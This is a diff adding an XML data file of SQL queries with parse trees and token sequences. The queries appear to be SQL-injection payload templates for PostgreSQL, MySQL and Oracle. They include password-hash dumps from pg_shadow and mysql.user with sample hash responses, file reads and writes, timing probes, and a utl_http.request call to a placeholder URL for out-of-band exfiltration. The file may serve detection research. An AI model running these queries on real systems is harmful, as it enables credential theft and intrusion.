@@ -1,0 +1,1180 @@
+<?xml version="1.0" ?>
+<queries>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT user
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION user)))))
+        </parsed>
+        <tokens>
+            121, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT current_user
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION current_user)))))
+        </parsed>
+        <tokens>
+            121, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT session_user
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION session_user)))))
+        </parsed>
+        <tokens>
+            121, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT getpgusername()
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (FUNCTION_EXPRESSION getpgusername)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 48, 50
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT usename, passwd FROM pg_shadow
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION usename)) (ALIAS (COLUMN_EXPRESSION passwd))) (FROM (ALIAS pg_shadow))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 49, 237, 80, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION usename)) (ALIAS (COLUMN_EXPRESSION usecreatedb)) (ALIAS (COLUMN_EXPRESSION usesuper)) (ALIAS (COLUMN_EXPRESSION usecatupd))) (FROM (ALIAS pg_user))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 49, 237, 80, 49, 237, 80, 49, 237, 80, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT pg_sleep(10)
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (FUNCTION_EXPRESSION pg_sleep (INTEGER_LITERAL 10))))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 48, 89, 50
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT usename FROM pg_user WHERE usesuper IS TRUE
+        </query>
+        <parsed/>
+        <tokens>
+            237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT version()
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (FUNCTION_EXPRESSION version)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 48, 50
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT current_database()
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (FUNCTION_EXPRESSION current_database)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 48, 50
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT datname FROM pg_database ORDER BY datname LIMIT 1 OFFSET {@row@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION datname))) (FROM (ALIAS pg_database))) (ORDER (ORDERING (COLUMN_EXPRESSION datname))) (LIMIT 1 1))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80, 237, 114, 237, 42, 237, 80, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT usename FROM pg_user order by usename limit 1 offset {@row@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION usename))) (FROM (ALIAS pg_user))) (order (ORDERING (COLUMN_EXPRESSION usename))) (limit 1 1))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80, 237, 114, 237, 42, 237, 80, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind='r' AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid) limit 1 offset {@row@}
+        </query>
+        <parsed/>
+        <tokens>
+            40, 80, 237, 122, 237, 80, 40, 80, 237, 80, 237, 127, 237, 131, 237, 80, 40, 80, 237, 80, 237, 132, 237, 80, 40, 80, 237, 51, 237, 80, 40, 80, 237, 123, 237, 80, 40, 80, 51, 91, 237, 45, 237, 80, 40, 80, 237, 43, 237, 47, 237, 48, 91, 49, 237, 91, 50, 237, 45, 237, 80, 40, 80, 48, 80, 40, 80, 50, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') limit 1 offset {@row@}
+        </query>
+        <parsed/>
+        <tokens>
+            49, 237, 80, 237, 80, 49, 237, 80, 237, 80, 49, 237, 80, 237, 80, 237, 123, 237, 48, 80, 40, 80, 51, 91, 50, 237, 45, 237, 48, 80, 40, 80, 51, 80, 40, 80, 50, 237, 45, 237, 48, 80, 40, 80, 51, 80, 40, 80, 50, 237, 45, 237, 48, 80, 40, 80, 51, 80, 40, 80, 50, 237, 45, 237, 48, 80, 40, 80, 66, 89, 50, 237, 45, 237, 48, 43, 237, 80, 40, 80, 50, 237, 45, 237, 48, 80, 40, 80, 237, 80, 237, 91, 50, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') AND attname LIKE '{@column_name@}' limit 1 offset {@row@}
+        </query>
+        <parsed/>
+        <tokens>
+            49, 237, 80, 237, 80, 49, 237, 80, 237, 80, 49, 237, 80, 237, 80, 237, 123, 237, 48, 80, 40, 80, 51, 91, 50, 237, 45, 237, 48, 80, 40, 80, 51, 80, 40, 80, 50, 237, 45, 237, 48, 80, 40, 80, 51, 80, 40, 80, 50, 237, 45, 237, 48, 80, 40, 80, 51, 80, 40, 80, 50, 237, 45, 237, 48, 80, 40, 80, 66, 89, 50, 237, 45, 237, 48, 43, 237, 80, 40, 80, 50, 237, 45, 237, 48, 80, 40, 80, 237, 80, 237, 91, 50, 237, 45, 237, 80, 237, 60, 237, 91, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            postgresql
+        </database>
+        <query>
+            SELECT CAST({@COLUMN_NAME@} as text) FROM {@table_name@} limit 1 offset {@row@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (CAST (COLUMN_EXPRESSION column_name) (TYPE TYPE_PARAMS text)))) (FROM (ALIAS table_name))) (limit 1 1))
+        </parsed>
+        <tokens>
+            121, 237, 82, 48, 80, 237, 83, 237, 80, 50, 237, 122, 237, 80, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT user()
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (FUNCTION_EXPRESSION user)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 48, 50
+        </tokens>
+        <response>
+        	root@localhost
+        </response>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT @@version
+        </query>
+        <parsed/>
+        <tokens>
+            98, 80
+        </tokens>
+        <response>
+        	5.1.49-3
+        </response>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT database()
+        </query>
+        <parsed/>
+        <tokens>
+            48, 50
+        </tokens>
+        <response>
+        	wordpress
+        </response>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT schema_name FROM information_schema.schemata limit 1 offset {@row@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION schema_name))) (FROM (ALIAS (schemata information_schema)))) (limit 1 1))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80, 40, 80, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+        <response>
+        	information_schema blog forum mysql phpmyadmin
+        </response>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT user FROM mysql.user limit 1 offset {@row@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION user))) (FROM (ALIAS (user mysql)))) (limit 1 1))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80, 40, 80, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+        <response>
+        	debian-sys-maint root testuser
+        </response>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' and table_schema like '{@DATABASE@}' limit 1 offset {@row@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS (tables information_schema))) (WHERE (and (AND (!= (STRING_LITERAL 'mysql') (COLUMN_EXPRESSION table_schema)) (!= (STRING_LITERAL 'information_schema') (COLUMN_EXPRESSION table_schema))) (like (STRING_LITERAL 'database_name') (COLUMN_EXPRESSION table_schema))))) (limit 1 1))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80, 40, 80, 237, 123, 237, 80, 237, 58, 237, 91, 237, 45, 237, 80, 237, 58, 237, 91, 237, 45, 237, 80, 237, 60, 237, 91, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' limit 1 offset {@row@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS (tables information_schema))) (WHERE (AND (!= (STRING_LITERAL 'mysql') (COLUMN_EXPRESSION table_schema)) (!= (STRING_LITERAL 'information_schema') (COLUMN_EXPRESSION table_schema))))) (limit 1 1))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80, 40, 80, 237, 123, 237, 80, 237, 58, 237, 91, 237, 45, 237, 80, 237, 58, 237, 91, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT column_name FROM information_schema.columns WHERE table_schema like '{@DATABASE@}' and table_name like '{@TABLE_NAME@}' limit 1 offset {@row@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name))) (FROM (ALIAS (columns information_schema))) (WHERE (and (like (STRING_LITERAL 'database_name') (COLUMN_EXPRESSION table_schema)) (like (STRING_LITERAL 'table_name') (COLUMN_EXPRESSION table_name))))) (limit 1 1))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80, 40, 80, 237, 123, 237, 80, 237, 60, 237, 91, 237, 45, 237, 80, 237, 60, 237, 91, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT CONCAT(user,':',password) FROM mysql.user limit 1 offset {@row@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (FUNCTION_EXPRESSION CONCAT (COLUMN_EXPRESSION user) (STRING_LITERAL ':') (COLUMN_EXPRESSION password)))) (FROM (ALIAS (user mysql)))) (limit 1 1))
+        </parsed>
+        <tokens>
+            121, 237, 80, 48, 80, 49, 91, 49, 80, 50, 237, 122, 237, 80, 40, 80, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+        <response>
+        	root:*0D3A44995CE7599C818F8E2B2A3BDAD77053EA69 debian-sys-maint:*45D7762381847D4F1A626190D70C0B33D8F796774 testuser:*00E247AC5F9AF26AE0194B41E1E7695D31A31122
+        </response>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION grantee)) (ALIAS (COLUMN_EXPRESSION privilege_type)) (ALIAS (COLUMN_EXPRESSION is_grantable))) (FROM (ALIAS (user_privileges information_schema))) (WHERE (= (COLUMN_EXPRESSION SUPER) (COLUMN_EXPRESSION privilege_type)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 49, 237, 80, 49, 237, 80, 237, 122, 237, 80, 40, 80, 237, 123, 237, 80, 237, 51, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION host)) (ALIAS (COLUMN_EXPRESSION user))) (FROM (ALIAS (user mysql))) (WHERE (= (COLUMN_EXPRESSION Y) (COLUMN_EXPRESSION Super_priv)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 49, 237, 80, 237, 122, 237, 80, 40, 80, 237, 123, 237, 80, 237, 51, 237, 80
+        </tokens>
+        <response>
+        	127.0.0.1 root
+        	localhost
+        	debian-sys-maint
+        </response>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT concat(File_priv,':',Create_priv,':',Select_priv) FROM mysql.user where user like '{@user_name@}' limit 1 offset {@row@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (FUNCTION_EXPRESSION concat (COLUMN_EXPRESSION File_priv) (STRING_LITERAL ':') (COLUMN_EXPRESSION Create_priv) (STRING_LITERAL ':') (COLUMN_EXPRESSION Select_priv)))) (FROM (ALIAS (user mysql))) (where (like (STRING_LITERAL 'user_name') (COLUMN_EXPRESSION user)))) (limit 1 1))
+        </parsed>
+        <tokens>
+            121, 237, 80, 48, 80, 49, 91, 49, 80, 49, 91, 49, 80, 50, 237, 122, 237, 80, 40, 80, 237, 123, 237, 80, 237, 60, 237, 91, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            LOAD_FILE('{@file_name@}')
+        </query>
+        <parsed/>
+        <tokens>
+            48, 91, 50
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT table_name FROM information_schema.columns WHERE column_name like '{@COLUMN_NAME@}' and table_schema like '{@DATABASE@}' limit 1 offset {@row@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS (columns information_schema))) (WHERE (and (like (STRING_LITERAL 'column_name') (COLUMN_EXPRESSION column_name)) (like (STRING_LITERAL 'database_name') (COLUMN_EXPRESSION table_schema))))) (limit 1 1))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80, 40, 80, 237, 123, 237, 80, 237, 60, 237, 91, 237, 45, 237, 80, 237, 60, 237, 91, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT {@COLUMN_NAME@} FROM {@table_name@} limit 1 offset {@row@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name))) (FROM (ALIAS table_name))) (limit 1 1))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80, 237, 115, 237, 89, 237, 116, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT BENCHMARK(1000000,MD5(‘A’))
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (FUNCTION_EXPRESSION BENCHMARK (INTEGER_LITERAL 1000000) (FUNCTION_EXPRESSION MD5 (COLUMN_EXPRESSION A)))))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 48, 89, 49, 80, 48, 80, 50, 50
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT SLEEP(5)
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (FUNCTION_EXPRESSION SLEEP (INTEGER_LITERAL 5))))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 48, 89, 50
+        </tokens>
+    </query>
+    <query>
+        <database>
+            mysql
+        </database>
+        <query>
+            SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’
+        </query>
+        <parsed/>
+        <tokens>
+            75, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            select user from dual@{@DBLINK@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION user))) (from (ALIAS dual))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            select owner from (select owner, rownum as r from (SELECT distinct owner FROM all_tables@{@DBLINK@})) WHERE r={@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (from (ALIAS (SELECT (SELECT_CORE distinct (COLUMNS (ALIAS (COLUMN_EXPRESSION owner))) (FROM (ALIAS all_tables)))))))))) (WHERE (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 48, 121, 237, 81, 237, 80, 237, 122, 237, 80, 50, 50, 237, 123, 237, 80, 51, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            SELECT banner FROM v$version@{@DBLINK@} WHERE banner LIKE 'Oracle%%'
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION banner))) (FROM (ALIAS v$version)) (WHERE (LIKE (STRING_LITERAL 'Oracle%%') (COLUMN_EXPRESSION banner)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 60, 237, 91
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            SELECT sys_context('USERENV', 'ISDBA') FROM dual@{@DBLINK@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (FUNCTION_EXPRESSION sys_context (STRING_LITERAL 'USERENV') (STRING_LITERAL 'ISDBA')))) (FROM (ALIAS dual))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 48, 91, 49, 237, 91, 50, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            SELECT SYS.DATABASE_NAME FROM DUAL@{@DBLINK@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION (DATABASE_NAME SYS)))) (FROM (ALIAS DUAL))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 40, 80, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            SELECT column_name FROM (SELECT column_name, rownum as r FROM all_tab_columns@{@DBLINK@} WHERE table_name = '{@TABLE_NAME@}' ) WHERE r={@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION column_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS all_tab_columns)) (WHERE (= (STRING_LITERAL 'table_name') (COLUMN_EXPRESSION table_name))))))) (WHERE (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 51, 237, 91, 237, 50, 237, 123, 237, 80, 51, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            SELECT owner FROM (SELECT owner, rownum as r FROM all_tab_columns@{@DBLINK@} WHERE table_name = '{@TABLE_NAME@}' ) WHERE r={@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION owner)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS all_tab_columns)) (WHERE (= (STRING_LITERAL 'table_name') (COLUMN_EXPRESSION table_name))))))) (WHERE (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 51, 237, 91, 237, 50, 237, 123, 237, 80, 51, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            select utl_http.request('{@URL@}') from dual@{@DBLINK@}
+        </query>
+        <parsed/>
+        <tokens>
+            40, 80, 48, 91, 50, 237, 122, 237, 80
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            select table_name from (SELECT table_name, rownum as r FROM all_tables@{@DBLINK@}) where r={@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS all_tables)))))) (where (= (INTEGER_LITERAL 1) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 80, 50, 237, 123, 237, 80, 51, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            select table_name from (select table_name, rownum as r from (select distinct table_name from all_tab_columns@{@DBLINK@} where owner = '{@USER_NAME@}')) where r BETWEEN {@ROW@} and {@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (from (ALIAS (SELECT (SELECT_CORE distinct (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS all_tab_columns)) (where (= (STRING_LITERAL '{@USER_NAME@}') (COLUMN_EXPRESSION owner))))))))))) (where (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 48, 121, 237, 81, 237, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 51, 237, 91, 50, 50, 237, 123, 237, 80, 237, 56, 237, 89, 237, 45, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            select USERNAME || ':' || DB_LINK from (select DB_LINK, rownum as r from ALL_DB_LINKS@{@DBLINK@}) where r BETWEEN {@ROW@} and {@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (|| (|| (COLUMN_EXPRESSION USERNAME) (STRING_LITERAL ':')) (COLUMN_EXPRESSION DB_LINK)))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION DB_LINK)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (from (ALIAS ALL_DB_LINKS)))))) (where (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 77, 237, 91, 237, 77, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 80, 50, 237, 123, 237, 80, 237, 56, 237, 89, 237, 45, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            select table_name from (SELECT table_name, rownum as r FROM user_tables@{@DBLINK@}) where r BETWEEN {@ROW@} and {@ROW@}
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (from (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION rownum) r)) (FROM (ALIAS user_tables)))))) (where (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 237, 80, 237, 83, 237, 80, 237, 122, 237, 80, 50, 237, 123, 237, 80, 237, 56, 237, 89, 237, 45, 237, 89
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            SELECT table_name FROM (SELECT table_name,r FROM ( SELECT ROWNUM as r, table_name FROM user_tab_columns@{@DBLINK@} where column_name like '{@COLUMN_NAME@}') WHERE r BETWEEN {@ROW@} and {@ROW@})
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION r))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION ROWNUM) r) (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS user_tab_columns)) (where (like (STRING_LITERAL 'column_name') (COLUMN_EXPRESSION column_name))))))) (WHERE (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))))))
+        </parsed>
+        <tokens>
+            121, 237, 80, 237, 122, 237, 48, 121, 237, 80, 49, 80, 237, 122, 237, 48, 237, 121, 237, 80, 237, 83, 237, 80, 49, 237, 80, 237, 122, 237, 80, 237, 123, 237, 80, 237, 60, 237, 91, 50, 237, 123, 237, 80, 237, 56, 237, 89, 237, 45, 237, 89, 50
+        </tokens>
+    </query>
+    <query>
+        <database>
+            oracle_dblinks
+        </database>
+        <query>
+            SELECT table_name FROM (SELECT table_name,owner,r FROM ( SELECT ROWNUM as r, table_name,owner FROM all_tab_columns@{@DBLINK@} where column_name like '{@COLUMN_NAME@}') WHERE r BETWEEN {@ROW@} and {@ROW@})
+        </query>
+        <parsed>
+            (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION owner)) (ALIAS (COLUMN_EXPRESSION r))) (FROM (ALIAS (SELECT (SELECT_CORE (COLUMNS (ALIAS (COLUMN_EXPRESSION ROWNUM) r) (ALIAS (COLUMN_EXPRESSION table_name)) (ALIAS (COLUMN_EXPRESSION owner))) (FROM (ALIAS all_tab_columns)) (where (like (STRING_LITERAL 'column_name') (COLUMN_EXPRESSION column_name))))))) (WHERE (BETWEEN (and (INTEGER_LITERAL 1) (INTEGER_LITERAL 1)) (COLUMN_EXPRESSION r)))))))))
+        </parsed>
